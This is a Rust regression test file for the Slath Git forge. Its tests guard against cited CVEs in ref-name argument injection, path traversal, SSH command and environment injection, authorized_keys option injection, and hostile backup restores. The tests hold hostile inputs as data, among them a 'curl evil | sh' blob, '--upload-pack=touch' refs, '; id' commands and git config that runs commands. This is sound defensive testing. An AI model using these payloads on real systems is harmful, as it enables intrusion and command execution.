// SPDX-FileCopyrightText: 2026 Erich Seifert <dev@erichseifert.de>
// SPDX-License-Identifier: AGPL-3.0-or-later
//! Regression tests derived from advisories in other forges and in Git.
//! Each test names the advisory it guards against.
//!
//! This file covers Git and SSH transport, repository storage, code browser
//! paths, backup restore, and archives.

use std::io::Write;
use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};
use std::time::{Duration, Instant};

use sha2::{Digest, Sha256};
use slath_tests::fixtures;
use slath_tests::server::{DEMO, GitClient, Instance, PASSWORD, TestServer};
use slath_tests::sshd::{self, Sshd};

/// Sends one raw HTTP/1.1 GET (no client-side URL normalization) and
/// returns (status, body).
fn raw_get(s: &TestServer, path: &[u8], cookie: Option<&str>) -> (u16, String) {
    let mut req = b"GET ".to_vec();
    req.extend_from_slice(path);
    req.extend_from_slice(b" HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n");
    if let Some(c) = cookie {
        req.extend_from_slice(format!("Cookie: {c}\r\n").as_bytes());
    }
    req.extend_from_slice(b"\r\n");
    let resp = s.raw_request(&req);
    let text = String::from_utf8_lossy(&resp).into_owned();
    let status = text
        .split_whitespace()
        .nth(1)
        .and_then(|s| s.parse().ok())
        .unwrap_or(0);
    let body = text
        .split_once("\r\n\r\n")
        .map_or("", |(_, b)| b)
        .to_owned();
    (status, body)
}

/// Runs git with `stdin`, returning stdout (trimmed).
fn git_stdin(git: &GitClient, cwd: &Path, args: &[&str], stdin: &[u8]) -> String {
    let mut child = git
        .cmd(cwd)
        .args(args)
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .unwrap();
    child.stdin.take().unwrap().write_all(stdin).unwrap();
    let out = child.wait_with_output().unwrap();
    assert!(
        out.status.success(),
        "git {args:?}: {}",
        String::from_utf8_lossy(&out.stderr)
    );
    String::from_utf8(out.stdout).unwrap().trim().to_owned()
}

/// Writes a tree object byte for byte (no validation), from
/// (mode, name, hex object ID) entries in the given order.
fn literal_tree(git: &GitClient, cwd: &Path, entries: &[(&str, &[u8], &str)]) -> String {
    let mut data = Vec::new();
    for (mode, name, oid) in entries {
        data.extend_from_slice(mode.as_bytes());
        data.push(b' ');
        data.extend_from_slice(name);
        data.push(0);
        let raw: Vec<u8> = (0..oid.len())
            .step_by(2)
            .map(|i| u8::from_str_radix(&oid[i..i + 2], 16).unwrap())
            .collect();
        data.extend_from_slice(&raw);
    }
    git_stdin(
        git,
        cwd,
        &["hash-object", "-t", "tree", "--literally", "-w", "--stdin"],
        &data,
    )
}

fn blob(git: &GitClient, cwd: &Path, data: &[u8]) -> String {
    git_stdin(git, cwd, &["hash-object", "-w", "--stdin"], data)
}

fn commit(git: &GitClient, cwd: &Path, tree: &str) -> String {
    git_stdin(git, cwd, &["commit-tree", tree], b"crafted\n")
}

/// A tree entry to craft: (mode, name, object ID).
type Entry = (&'static str, Vec<u8>, String);

/// A scratch repository for crafting objects.
fn scratch(git: &GitClient) -> tempfile::TempDir {
    let d = tempfile::tempdir().unwrap();
    git.ok(d.path(), &["init", "-q"]);
    d
}

// --- refs and paths in browser URLs ------------------------------------------

/// Argument injection through ref names reaching `git` command lines:
/// Gogs CVE-2024-39932 (`--output` via a ref in the diff preview) and the
/// Gitea option-injection fixes in raw, archive, and compare.
#[test]
fn conf_sec_01_dash_prefixed_ref_names_inert() {
    let s = TestServer::start();
    let git = GitClient::new();
    let work = tempfile::tempdir().unwrap();
    let src = work.path().join("src");
    fixtures::generate("basic", &src, &[]);
    git.ok(
        &src,
        &["push", "-q", &s.url(&DEMO), "refs/heads/*:refs/heads/*"],
    );
    let sentinel = Path::new("/tmp/slath-pwned");
    let _ = std::fs::remove_file(sentinel);
    // Pushing such refs may be refused by Git or by Slath; either is fine.
    for r in [
        "refs/heads/--output=/tmp/slath-pwned",
        "refs/heads/-c",
        "refs/tags/--exec=touch$IFS/tmp/slath-pwned",
        "refs/heads/--upload-pack=touch x",
    ] {
        let _ = git
            .cmd(&src)
            .args(["push", "-q", &s.url(&DEMO), &format!("main:{r}")])
            .output();
    }
    let mut a = s.login("alice", PASSWORD);
    for path in [
        "/alice/demo/tree/--output=%2Ftmp%2Fslath-pwned",
        "/alice/demo/tree/--output=/tmp/slath-pwned",
        "/alice/demo/tree/-c",
        "/alice/demo/blob/--output=/tmp/slath-pwned/README.md",
        "/alice/demo/blob/-c/README.md",
        "/alice/demo/raw/--output=/tmp/slath-pwned/README.md",
        "/alice/demo/raw/-c/README.md",
        "/alice/demo/archive/--output=x.zip",
        "/alice/demo/archive/--exec=id.tar.gz",
        "/alice/demo/archive/-c.tar.gz",
        "/alice/demo/commits/--all",
        "/alice/demo/commits/-c",
        "/alice/demo/commit/--output=x",
        "/api/v1/repos/alice/demo/branches/--output=x",
        "/api/v1/repos/alice/demo/tree/--output=%2Ftmp%2Fslath-pwned",
        "/api/v1/repos/alice/demo/blob/-c?path=README.md",
        "/api/v1/repos/alice/demo/commits?ref=--all",
    ] {
        let r = if path.starts_with("/api/") {
            slath_tests::http::Client::new(&s.base()).api("GET", path, Some(&s.token), None)
        } else {
            a.get(path)
        };
        assert!(
            matches!(r.status, 200 | 400 | 404 | 422),
            "{path}: {}",
            r.status
        );
    }
    assert!(!sentinel.exists(), "a ref name reached git as an option");
    assert!(!s.log().contains("panicked"));
}

/// Encoded traversal in file paths: GitLab CVE-2023-2825 (uploads path
/// traversal), OneDev CVE-2024-45309 (file read via encoded `..`).
#[test]
fn conf_sec_01_tree_path_traversal_variants() {
    let s = TestServer::start();
    let git = GitClient::new();
    let work = tempfile::tempdir().unwrap();
    let src = work.path().join("src");
    fixtures::generate("basic", &src, &[]);
    git.ok(
        &src,
        &["push", "-q", &s.url(&DEMO), "refs/heads/*:refs/heads/*"],
    );
    s.db.execute("UPDATE repositories SET visibility = 'public'");
    let long = "a/".repeat(2049);
    let variants: Vec<Vec<u8>> = [
        "../../../../etc/passwd",
        "..%2f..%2f..%2fetc%2fpasswd",
        "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252fetc%252fpasswd",
        "..%5c..%5cetc%5cpasswd",
        "%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
        ".%00/etc/passwd",
        "README.md%00",
        "README.md%00.txt",
        "/etc/passwd",
        "//etc/passwd",
        "README.md/..",
        "README.md/../README.md",
        "./README.md",
        long.as_str(),
    ]
    .iter()
    .map(|v| v.as_bytes().to_vec())
    .chain([b"..\\..\\etc\\passwd".to_vec()])
    .collect();
    for v in &variants {
        for kind in ["raw", "blob", "tree"] {
            let mut path = format!("/alice/demo/{kind}/main/").into_bytes();
            path.extend_from_slice(v);
            let (status, body) = raw_get(&s, &path, None);
            let shown = String::from_utf8_lossy(&path)
                .chars()
                .take(80)
                .collect::<String>();
            assert!(matches!(status, 400 | 404), "{shown}: {status}");
            assert!(!body.contains("root:x:0"), "{shown}: file content leaked");
        }
    }
    // `a/./b` style segments never resolve to something else than a 404 or
    // the same file.
    let (status, _) = raw_get(&s, b"/alice/demo/raw/main/./README.md", None);
    assert!(matches!(status, 200 | 400 | 404), "{status}");
    assert!(!s.log().contains("panicked"));
}

/// Symlinks are data, never followed on the server: Gogs CVE-2025-8110
/// (symlink in a repository used to overwrite files), Forgejo
/// CVE-2025-68937 (symlink following when serving files).
#[test]
fn conf_sec_08_symlink_raw_returns_target_text() {
    let s = TestServer::start();
    let git = GitClient::new();
    let d = tempfile::tempdir().unwrap();
    let w = d.path().join("w");
    std::fs::create_dir_all(&w).unwrap();
    git.ok(&w, &["init", "-q", "-b", "main"]);
    std::fs::write(w.join("README.md"), "hi\n").unwrap();
    std::os::unix::fs::symlink("/etc/passwd", w.join("link")).unwrap();
    std::os::unix::fs::symlink("../../../../config", w.join("link2")).unwrap();
    git.ok(&w, &["add", "-A"]);
    git.ok(&w, &["commit", "-q", "-m", "links"]);
    git.ok(&w, &["push", "-q", &s.url(&DEMO), "main"]);
    // A symlink pointing into `.git`: Git may refuse it; if it's accepted,
    // it must still not be followed.
    std::os::unix::fs::symlink(".git", w.join("dirlink")).unwrap();
    git.ok(&w, &["add", "-A"]);
    git.ok(&w, &["commit", "-q", "-m", "dirlink"]);
    let dirlink_pushed = git
        .cmd(&w)
        .args(["push", "-q", &s.url(&DEMO), "main:refs/heads/dirlink"])
        .output()
        .unwrap()
        .status
        .success();

    let mut a = s.login("alice", PASSWORD);
    let r = a.get("/alice/demo/raw/main/link");
    assert_eq!(r.status, 200);
    assert_eq!(r.body, "/etc/passwd");
    assert!(r.header("content-type").unwrap().starts_with("text/plain"));
    let r = a.get("/alice/demo/raw/main/link2");
    assert_eq!(r.body, "../../../../config");
    for path in [
        "/alice/demo/raw/main/link/x",
        "/alice/demo/raw/main/link2/x",
        "/alice/demo/blob/main/link2/x",
        "/alice/demo/raw/dirlink/dirlink/config",
        "/alice/demo/raw/dirlink/dirlink/HEAD",
    ] {
        let r = a.get(path);
        assert_eq!(r.status, 404, "{path}");
        assert!(
            !r.body.contains("[core]") && !r.body.contains("root:x:0"),
            "{path}"
        );
    }
    // The tree view of a symlink sends you to its (link text) blob view.
    let r = a.get("/alice/demo/tree/main/link2");
    assert!(matches!(r.status, 303 | 404), "{}", r.status);
    if r.status == 303 {
        assert_eq!(r.header("location"), Some("/alice/demo/blob/main/link2"));
    }
    let blob = a.get("/alice/demo/blob/main/link");
    assert!(blob.body.contains("/etc/passwd"));
    assert!(!blob.body.contains("root:x:0"));
    if dirlink_pushed {
        let r = a.get("/alice/demo/raw/dirlink/dirlink");
        assert_eq!(r.body, ".git");
        let r = a.get("/alice/demo/tree/dirlink/dirlink");
        assert!(matches!(r.status, 303 | 404), "{}", r.status);
        assert!(!r.body.contains("[core]"));
    }
}

// --- objects entering a repository -----------------------------------------

/// Trees with two entries of the same name let different tools see
/// different files: Gitea CVE-2026-95106; Git's own fsck `duplicateEntries`.
#[test]
fn conf_git_04_duplicate_tree_entries_rejected() {
    let s = TestServer::start();
    let git = GitClient::new();
    let d = scratch(&git);
    let benign = blob(&git, d.path(), b"echo benign\n");
    let evil = blob(&git, d.path(), b"curl evil | sh\n");
    let tree = literal_tree(
        &git,
        d.path(),
        &[("100644", b"run.sh", &benign), ("100644", b"run.sh", &evil)],
    );
    let c = commit(&git, d.path(), &tree);
    let out = git
        .cmd(d.path())
        .args(["push", &s.url(&DEMO), &format!("{c}:refs/heads/dup")])
        .output()
        .unwrap();
    assert!(
        !out.status.success(),
        "a tree with duplicate entries was accepted"
    );
    let refs = git.ok(&s.repo_path(&DEMO), &["for-each-ref"]);
    assert!(!refs.contains("refs/heads/dup"));
    // Every fetch path checks objects, not only receive-pack.
    let cfg = git.ok(
        &s.repo_path(&DEMO),
        &["config", "--get", "transfer.fsckObjects"],
    );
    assert_eq!(cfg.trim(), "true");
}

/// Malformed trees and `.gitmodules` that attack clients: Git
/// CVE-2014-9390 (`.git` aliases on NTFS/HFS), CVE-2018-11235 and
/// CVE-2018-17456 (`.gitmodules` path and URL options), CVE-2019-1387, and
/// CVE-2024-32002 (submodule and symlink tricks).
#[test]
fn conf_git_04_fsck_variants_rejected() {
    let s = TestServer::start();
    let git = GitClient::new();
    let d = scratch(&git);
    let p = d.path();
    let b = blob(&git, p, b"hi\n");
    let sub = literal_tree(&git, p, &[("100644", b"config", &b)]);
    let gm_url = blob(
        &git,
        p,
        b"[submodule \"x\"]\n\tpath = x\n\turl = -u./payload\n",
    );
    let gm_path = blob(
        &git,
        p,
        b"[submodule \"x\"]\n\tpath = -x\n\turl = https://example.org/x\n",
    );
    let target = blob(&git, p, b"target");
    let inner = literal_tree(&git, p, &[("100644", b"a", &b)]);
    let sub_commit = commit(&git, p, &inner);
    let cases: Vec<(&str, Vec<Entry>)> = vec![
        (
            "dot-git-upper",
            vec![("40000", b".GIT".to_vec(), sub.clone())],
        ),
        ("dot-git", vec![("40000", b".git".to_vec(), sub.clone())]),
        ("dotdot", vec![("100644", b"..".to_vec(), b.clone())]),
        (
            "ntfs-short",
            vec![("40000", b"git~1".to_vec(), sub.clone())],
        ),
        (
            "hfs-ignorable",
            vec![("40000", ".g\u{200c}it".as_bytes().to_vec(), sub.clone())],
        ),
        (
            "gitmodules-url",
            vec![("100644", b".gitmodules".to_vec(), gm_url)],
        ),
        (
            "gitmodules-path",
            vec![("100644", b".gitmodules".to_vec(), gm_path)],
        ),
        (
            "gitmodules-symlink",
            vec![("120000", b".gitmodules".to_vec(), target)],
        ),
        (
            "submodule-dot-git",
            vec![("160000", b".git".to_vec(), sub_commit)],
        ),
    ];
    for (name, entries) in cases {
        let entries: Vec<(&str, &[u8], &str)> = entries
            .iter()
            .map(|(m, n, o)| (*m, n.as_slice(), o.as_str()))
            .collect();
        let tree = literal_tree(&git, p, &entries);
        let c = commit(&git, p, &tree);
        let out = git
            .cmd(p)
            .args(["push", &s.url(&DEMO), &format!("{c}:refs/heads/{name}")])
            .output()
            .unwrap();
        assert!(!out.status.success(), "{name}: accepted");
    }
    let refs = git.ok(&s.repo_path(&DEMO), &["for-each-ref"]);
    assert!(refs.is_empty(), "{refs}");
    // A well-formed object still goes through.
    let ok = literal_tree(&git, p, &[("100644", b"fine", &b)]);
    let c = commit(&git, p, &ok);
    git.ok(
        p,
        &["push", "-q", &s.url(&DEMO), &format!("{c}:refs/heads/main")],
    );
}

// --- SSH ----------------------------------------------------------------------

struct SshEnv {
    // Stop sshd before the server and its directory go away.
    sshd: Sshd,
    server: TestServer,
    _keys: tempfile::TempDir,
    key: PathBuf,
}

fn ssh_env() -> Option<SshEnv> {
    if sshd::skipped() {
        eprintln!("SLATH_SKIP_SSH_TESTS=1: skipping");
        return None;
    }
    let keys = tempfile::tempdir().unwrap();
    let (key, public) = sshd::keygen(keys.path(), "alice");
    let server = TestServer::start();
    server.add_ssh_key("alice", &public);
    let git = GitClient::new();
    let work = tempfile::tempdir().unwrap();
    let src = work.path().join("src");
    fixtures::generate("basic", &src, &[]);
    git.ok(
        &src,
        &[
            "push",
            "-q",
            &server.url(&DEMO),
            "refs/heads/*:refs/heads/*",
        ],
    );
    let sshd = Sshd::start(&server);
    Some(SshEnv {
        sshd,
        server,
        _keys: keys,
        key,
    })
}

impl SshEnv {
    fn ssh(&self, extra: &[&str], command: &str) -> std::process::Output {
        Command::new("ssh")
            .args(self.sshd.ssh_args(&self.key))
            .args(extra)
            .arg("git@127.0.0.1")
            .arg(command)
            .stdin(Stdio::null())
            .output()
            .unwrap()
    }
}

/// The forced command accepts only a strict Git transport grammar: GitLab
/// Shell and Gitea `serv` command-parsing bypasses, Gitea's
/// `git-lfs-authenticate` sub-verb handling (G37).
#[test]
fn conf_git_02_ssh_path_variants() {
    let Some(env) = ssh_env() else { return };
    let id = env
        .server
        .db
        .query_one("SELECT id::text FROM repositories LIMIT 1");
    let unsupported = "slath: unsupported command (Slath only provides Git access over SSH)";
    let mut cases = vec![
        format!("git-upload-pack '../{}/{id}.git'", &id[..2]),
        format!("git-upload-pack '/srv/slath/repos/{}/{id}.git'", &id[..2]),
        format!(
            "git-upload-pack '{}'",
            env.server.repo_path(&DEMO).display()
        ),
    ];
    cases.extend(
        [
            "git-upload-pack 'alice/demo.git' ; id",
            "git-upload-pack 'alice/demo'\nid",
            "git-upload-pack \"alice/demo\"",
            "git-upload-pack 'alice/../x/demo'",
            "git-upload-pack alice/demo",
            "git-upload-pack 'alice/demo' extra",
            "git-upload-pack '-alice/demo'",
            "git-upload-pack 'alice/-demo'",
            "git-upload-pack 'alice/.demo'",
            "git-upload-pack '--upload-pack=touch /tmp/slath-pwned'",
            "git-upload-pack 'alice/demo'$(id)",
            "git-upload-pack `id`",
            "git-lfs-authenticate 'alice/demo' download",
            "git-lfs-authenticate alice/demo download x",
            "git-lfs-transfer 'alice/demo' download",
            "git-upload-pack",
            "",
        ]
        .map(str::to_owned),
    );
    for cmd in &cases {
        let out = env.ssh(&[], cmd);
        let stderr = String::from_utf8_lossy(&out.stderr);
        assert_eq!(out.status.code(), Some(1), "{cmd:?}: {stderr}");
        assert_eq!(stderr.trim(), unsupported, "{cmd:?}");
        assert!(out.stdout.is_empty(), "{cmd:?}: git ran");
    }
    let out = env.ssh(&[], "git-upload-archive 'alice/demo'");
    assert_eq!(out.status.code(), Some(1));
    assert_eq!(
        String::from_utf8_lossy(&out.stderr).trim(),
        "slath: git-upload-archive is not supported"
    );
    assert!(!Path::new("/tmp/slath-pwned").exists());
}

/// Environment from the SSH client never reaches Git except a validated
/// `GIT_PROTOCOL`: Gogs CVE-2024-39930 (argument injection through the
/// `env` request in the built-in SSH server).
#[test]
fn conf_git_03_ssh_protocol_env_injection() {
    let Some(env) = ssh_env() else { return };
    // The shared directory is visible to sshd at the same path.
    let sentinel = env.server.dir.path().join("pwned");
    let s = sentinel.display();
    // (A newline in the value can't be sent: the OpenSSH client cuts the
    // option there. The runner's GIT_PROTOCOL validation is unit-tested.)
    for value in [
        format!("GIT_PROTOCOL=version=2 --upload-pack=touch {s}"),
        format!("GIT_PROTOCOL=version=1:x=$(touch {s})"),
        "GIT_PROTOCOL=-c".to_owned(),
        "GIT_PROTOCOL=version=3".to_owned(),
    ] {
        let opt = format!("SetEnv=\"{value}\"");
        let out = env.ssh(&["-o", &opt], "git-upload-pack 'alice/demo'");
        let stdout = String::from_utf8_lossy(&out.stdout);
        // Dropped: Git falls back to the v0 advertisement with refs.
        assert!(
            stdout.contains("refs/heads/main"),
            "{value:?}: {stdout}{}",
            String::from_utf8_lossy(&out.stderr)
        );
        assert!(!stdout.contains("version 2"), "{value:?}");
    }
    // A valid value still selects protocol v2.
    let out = env.ssh(
        &["-o", "SetEnv=GIT_PROTOCOL=version=2"],
        "git-upload-pack 'alice/demo'",
    );
    assert!(String::from_utf8_lossy(&out.stdout).contains("version 2"));
    // Other variables are never accepted: clones still work and nothing runs.
    let work = tempfile::tempdir().unwrap();
    let ssh_cmd = format!(
        "{} -o SetEnv=LD_PRELOAD=/tmp/x.so -o \"SetEnv=GIT_CONFIG_PARAMETERS='core.sshCommand=touch {s}'\" \
         -o \"SetEnv=GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.fsmonitor GIT_CONFIG_VALUE_0=touch_{}\"",
        env.sshd.git_ssh_command(&env.key),
        s
    );
    let out = GitClient::new()
        .cmd(work.path())
        .env("GIT_SSH_COMMAND", &ssh_cmd)
        .args(["clone", "-q", &env.sshd.url("alice", "demo"), "c"])
        .output()
        .unwrap();
    assert!(
        out.status.success(),
        "{}\n{}",
        String::from_utf8_lossy(&out.stderr),
        env.sshd.logs()
    );
    assert!(!sentinel.exists(), "client environment reached the server");
}

fn lookup(s: &TestServer, fp: &str) -> (bool, String) {
    let sock = s.ipc_socket();
    let (ok, out, _) = s.slath(&["ssh-keys", "--socket", sock.to_str().unwrap(), fp], None);
    (ok, out)
}

fn test_key(name: &str) -> String {
    let p = Path::new(env!("CARGO_MANIFEST_DIR"))
        .join("../crates/auth/tests/data/ssh")
        .join(name);
    std::fs::read_to_string(p).unwrap().trim().to_owned()
}

/// Key lookup by exact, case-sensitive fingerprint only: Gitea
/// CVE-2026-103059 (case-insensitive fingerprint match let a crafted key
/// authenticate as another user).
#[test]
fn conf_git_02_ssh_fingerprint_lookup_exact() {
    let s = TestServer::start_with(&[]);
    s.create_user("alice", PASSWORD, false);
    s.add_ssh_key("alice", &test_key("ed25519.pub"));
    let fp = test_key("ed25519.fp");
    let (ok, line) = lookup(&s, &fp);
    assert!(ok && line.contains(" ssh-serve "), "{line}");
    let flipped: String = fp
        .chars()
        .map(|c| {
            if c.is_ascii_lowercase() {
                c.to_ascii_uppercase()
            } else {
                c.to_ascii_lowercase()
            }
        })
        .collect();
    let lower = fp.to_ascii_lowercase();
    let upper = format!("SHA256:{}", fp["SHA256:".len()..].to_ascii_uppercase());
    for probe in [
        flipped.as_str(),
        lower.as_str(),
        upper.as_str(),
        &fp[..fp.len() - 1],
        &fp[..20],
        &format!("{}%", &fp[..fp.len() - 1]),
        &format!("{}_", &fp[..fp.len() - 1]),
        "SHA256:%",
        &format!("{fp}="),
        &format!(" {fp}"),
        &format!("{fp}\n"),
        &fp["SHA256:".len()..],
        &fp.replace("SHA256:", "sha256:"),
        &fp.replace("SHA256:", "MD5:"),
    ] {
        let (ok, line) = lookup(&s, probe);
        assert!(ok, "{probe:?}");
        assert!(line.is_empty(), "{probe:?} matched: {line}");
    }
}

/// The `authorized_keys` line printed for sshd can't carry extra options:
/// Gitea CVE-2026-103059 follow-up and the classic authorized_keys option
/// injection (GitLab CVE-2017-0919 style) through key type or comment.
#[test]
fn conf_sec_01_ssh_keys_output_injection() {
    let s = TestServer::start_with(&[]);
    s.create_user("alice", PASSWORD, false);
    let good = test_key("ed25519.pub");
    let parts: Vec<&str> = good.split_whitespace().collect();
    let (kind, b64) = (parts[0], parts[1]);
    // Hostile key lines through the settings form are refused or stored
    // without their options and comments.
    let mut c = s.login("alice", PASSWORD);
    for hostile in [
        format!("command=\"sh\" {kind} {b64}"),
        format!("{kind} {b64} x\ncommand=\"sh\" {kind} {b64}"),
        format!("{kind}\ncommand=\"sh\" {b64}"),
        format!("{kind} {b64}\" ,command=\"sh"),
        format!("restrict,pty {kind} {b64}"),
    ] {
        let r = slath_tests::http::submit(
            &mut c,
            "/-/settings/keys",
            "/-/settings/keys",
            &[("title", "x"), ("key", &hostile)],
        );
        assert!(matches!(r.status, 303 | 422), "{hostile:?}: {}", r.status);
        let _ = s.db.query_one("SELECT count(*)::text FROM ssh_keys");
        s.db.execute("DELETE FROM ssh_keys");
    }
    // The database refuses unsafe values outright.
    let fp = test_key("ed25519.fp");
    let user = s.db.query_one(
        "SELECT u.id::text FROM users u JOIN namespaces n ON n.id = u.namespace_id WHERE n.name = 'alice'",
    );
    s.add_ssh_key("alice", &good);
    for (col, value) in [
        ("key_type", "ssh-ed25519\ncommand=\"sh\""),
        ("key_type", "ssh-ed25519 x"),
        ("public_key", "AAAA\" command=\"sh"),
        ("public_key", "AAAA AAAA"),
    ] {
        let sql = format!(
            "DO $$ BEGIN UPDATE ssh_keys SET {col} = E'{}' WHERE user_id = '{user}'; \
             RAISE EXCEPTION 'accepted'; EXCEPTION WHEN check_violation THEN NULL; END $$",
            value.replace('\n', "\\n").replace('\'', "\\'")
        );
        s.db.execute(&sql);
    }
    // Even if a row got corrupted (constraint gone), nothing unsafe is printed.
    for (constraint_col, col, value) in [
        ("key_type", "key_type", "ssh-ed25519\ncommand=\"sh\""),
        ("public_key", "public_key", "AAAA\" command=\"sh"),
    ] {
        let name = s.db.query_one(&format!(
            "SELECT conname::text FROM pg_constraint WHERE conrelid = 'ssh_keys'::regclass \
             AND contype = 'c' AND pg_get_constraintdef(oid) LIKE '%{constraint_col} ~%'"
        ));
        s.db.execute(&format!("ALTER TABLE ssh_keys DROP CONSTRAINT {name}"));
        s.db.execute(&format!(
            "UPDATE ssh_keys SET {col} = E'{}' WHERE user_id = '{user}'",
            value.replace('\n', "\\n").replace('"', "\\\"")
        ));
        let (_, line) = lookup(&s, &fp);
        assert!(line.is_empty(), "printed an unsafe line: {line}");
        s.db.execute(&format!("DELETE FROM ssh_keys WHERE user_id = '{user}'"));
        s.add_ssh_key("alice", &good);
    }
    let (ok, line) = lookup(&s, &fp);
    assert!(ok);
    assert_eq!(line.lines().count(), 1, "{line}");
    assert!(line.starts_with("restrict,command=\""), "{line}");
    assert_eq!(line.matches("command=").count(), 1, "{line}");
}

// --- backup restore -------------------------------------------------------

fn backup(s: &TestServer, out: &Path) {
    let (ok, stdout, stderr) = s.slath(
        &["backup", "create", "--output", out.to_str().unwrap()],
        None,
    );
    assert!(ok, "backup failed: {stdout}{stderr}");
}

/// Lists `rel` in the manifest with a correct checksum (an attacker who
/// controls the backup can always do that).
fn list(dir: &Path, rel: &str, data: &[u8]) {
    let mpath = dir.join("manifest.json");
    let mut m: serde_json::Value = serde_json::from_slice(&std::fs::read(&mpath).unwrap()).unwrap();
    let sum: String = Sha256::digest(data)
        .iter()
        .map(|b| format!("{b:02x}"))
        .collect();
    m["files"][rel] = serde_json::Value::String(sum);
    std::fs::write(&mpath, serde_json::to_vec(&m).unwrap()).unwrap();
}

fn plant(dir: &Path, rel: &str, data: &[u8]) {
    let path = dir.join(rel);
    if let Some(p) = path.parent() {
        let _ = std::fs::create_dir_all(p);
    }
    let _ = std::fs::write(&path, data);
    list(dir, rel, data);
}

fn copy_tree(from: &Path, to: &Path) {
    std::fs::create_dir_all(to).unwrap();
    for e in std::fs::read_dir(from).unwrap() {
        let e = e.unwrap();
        let dest = to.join(e.file_name());
        if e.file_type().unwrap().is_dir() {
            copy_tree(&e.path(), &dest);
        } else {
            std::fs::copy(e.path(), dest).unwrap();
        }
    }
}

/// Restores a tampered copy of `original` and expects a refusal before
/// anything is written.
fn assert_refused(original: &Path, tamper: impl FnOnce(&Path), expect: &str) {
    let tmp = tempfile::tempdir().unwrap();
    let dir = tmp.path().join("b");
    copy_tree(original, &dir);
    tamper(&dir);
    let target = Instance::new("");
    let (ok, stdout, stderr) = target.slath(
        &["backup", "restore", "--input", dir.to_str().unwrap()],
        None,
    );
    assert!(!ok, "{expect}: restore succeeded: {stdout}");
    assert!(stderr.contains(expect), "{expect}: {stderr}");
    assert_eq!(
        target
            .db
            .query_one("SELECT count(*)::text FROM pg_tables WHERE schemaname = 'public'"),
        "0",
        "{expect}: the database was touched"
    );
    let repos = target.dir.path().join("data/repos");
    assert!(
        !repos.exists() || std::fs::read_dir(&repos).unwrap().next().is_none(),
        "{expect}: repositories were written"
    );
}

fn backed_up_server() -> (TestServer, tempfile::TempDir, PathBuf, String) {
    let s = TestServer::start();
    let git = GitClient::new();
    let work = tempfile::tempdir().unwrap();
    let src = work.path().join("src");
    fixtures::generate("basic", &src, &[]);
    git.ok(
        &src,
        &["push", "-q", &s.url(&DEMO), "refs/heads/*:refs/heads/*"],
    );
    let out = tempfile::tempdir().unwrap();
    let dir = out.path().join("good");
    backup(&s, &dir);
    let id = s.db.query_one("SELECT id::text FROM repositories LIMIT 1");
    (s, out, dir, id)
}

/// Repository config from a backup could run commands (`core.fsmonitor`,
/// `core.sshCommand`, hooks): Gitea's restore-repo LFI/RCE family and Git
/// CVE-2024-32004/32465 (untrusted repositories with hostile config).
#[test]
fn conf_sec_01_restored_repo_config_rewritten() {
    let (s, _out, dir, id) = backed_up_server();
    let repo = format!("repos/{id}.git");
    let sentinel = s.dir.path().join("pwned");
    let evil = format!(
        "[core]\n\tfsmonitor = touch {p}\n\tsshCommand = touch {p}\n\thooksPath = /tmp\n\
         \tpager = touch {p}\n[include]\n\tpath = /etc/passwd\n[uploadpack]\n\tpackObjectsHook = touch {p}\n\
         [diff]\n\texternal = touch {p}\n[filter \"x\"]\n\tsmudge = touch {p}\n\
         [remote \"origin\"]\n\tuploadpack = touch {p}\n",
        p = sentinel.display()
    );
    for (rel, data) in [
        (format!("{repo}/config"), evil.as_bytes().to_vec()),
        (
            format!("{repo}/hooks/post-receive"),
            b"#!/bin/sh\ntouch /tmp/slath-pwned\n".to_vec(),
        ),
        (
            format!("{repo}/hooks/pre-receive"),
            b"#!/bin/sh\nexit 0\n".to_vec(),
        ),
        (
            format!("{repo}/objects/info/alternates"),
            b"/etc\n".to_vec(),
        ),
        (format!("{repo}/info/attributes"), b"* filter=x\n".to_vec()),
        (
            format!("{repo}/HEAD"),
            b"ref: refs/heads/../../../etc/passwd\n".to_vec(),
        ),
    ] {
        assert_refused(&dir, |d| plant(d, &rel, &data), "unexpected file");
    }

    // The untampered backup restores with Slath's own config.
    let target = Instance::new("");
    let (ok, stdout, stderr) = target.slath(
        &["backup", "restore", "--input", dir.to_str().unwrap()],
        None,
    );
    assert!(ok, "{stdout}{stderr}");
    let t = target.start(&[]);
    let restored = std::fs::read_to_string(t.repo_path(&DEMO).join("config")).unwrap();
    let original = std::fs::read_to_string(s.repo_path(&DEMO).join("config")).unwrap();
    assert_eq!(restored, original);
    let mut a = t.login("alice", PASSWORD);
    for path in [
        "/alice/demo",
        "/alice/demo/tree/main",
        "/alice/demo/blob/main/README.md",
        "/alice/demo/commits/main",
        "/alice/demo/archive/main.tar.gz",
    ] {
        assert_eq!(a.get(path).status, 200, "{path}");
    }
    assert!(!sentinel.exists());
    assert!(!Path::new("/tmp/slath-pwned").exists());
}

/// Hostile entries in a backup can't write outside the target: Gitea
/// restore-repo path traversal, and the generic archive extraction family
/// (CVE-2007-4559 tarfile, "zip slip").
#[test]
fn conf_sec_01_restore_archive_entry_traversal() {
    let (_s, _out, dir, id) = backed_up_server();
    let repo = format!("repos/{id}.git");
    for bad in [
        "../../etc/cron.d/x",
        "/abs/path",
        "db/../../x.copy",
        "repos/../../x",
        "repos/x.git/refs/heads/main",
        &format!("{repo}/refs/../../../x"),
        &format!("{repo}/refs/heads/./main"),
        "repos//refs",
        "db\\..\\x.copy",
    ] {
        assert_refused(&dir, |d| list(d, bad, b"x"), "backup");
    }
    // A symlinked repository directory pointing outside the backup.
    assert_refused(
        &dir,
        |d| {
            let other = format!("repos/{}.git", "0192f1a2-3b4c-7d5e-8f60-718293a4b5c6");
            std::os::unix::fs::symlink("/etc", d.join(other)).unwrap();
        },
        "symbolic link",
    );
    assert_refused(
        &dir,
        |d| {
            std::os::unix::fs::symlink("/etc/passwd", d.join(format!("{repo}/refs/heads/evil")))
                .unwrap()
        },
        "symbolic link",
    );
    // A hard link to a file elsewhere (here: the backup's own config).
    assert_refused(
        &dir,
        |d| {
            std::fs::hard_link(
                d.join("config.toml"),
                d.join(format!("{repo}/refs/heads/hard")),
            )
            .unwrap()
        },
        "hard link",
    );
}

// --- archives ---------------------------------------------------------------

